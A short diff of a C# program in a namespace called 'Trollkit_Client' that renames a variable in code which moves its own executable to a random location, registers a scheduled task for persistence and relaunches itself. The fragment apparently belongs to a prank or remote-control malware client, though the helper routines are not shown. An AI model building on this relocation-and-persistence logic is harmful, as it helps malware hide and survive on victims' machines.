@@ -46,11 +46,11 @@ namespace Trollkit_Client
 
 			Virus virus = new Virus();
 			string randomLocation = virus.FindRandomFileLocation();
-			string newFileLocation = virus.MoveFileToLocation(randomLocation);
-			BConsole.WriteLine($"New File location: {newFileLocation}");
-			new TaskSchedulerHelper().CreateTask(newFileLocation);
+			string newExecutablePath = virus.MoveFileToLocation(randomLocation);
+			BConsole.WriteLine($"New File location: {newExecutablePath}");
+			new TaskSchedulerHelper().CreateTask(newExecutablePath);
 
-			Process.Start(newFileLocation, "move-completed");
+			Process.Start(newExecutablePath, "move-completed");
 		}
 
 		public Program()
